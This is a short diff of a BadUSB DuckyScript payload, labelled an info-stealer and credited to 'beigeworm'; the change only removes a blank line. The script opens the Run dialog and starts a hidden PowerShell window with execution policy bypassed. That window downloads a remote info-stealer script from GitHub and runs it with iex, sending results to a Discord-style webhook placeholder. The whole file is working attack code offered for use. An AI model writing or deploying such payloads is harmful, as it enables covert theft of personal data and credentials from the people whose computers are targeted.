@@ -1,6 +1,5 @@
 REM Payload for info-stealer
 REM Credits to beigeworm
-
 GUI r
 DELAY 500
 STRING powershell -w h -ep bypass $dc='WEBHOOK_HERE';irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/info-stealer/info-stealer.ps1 | iex
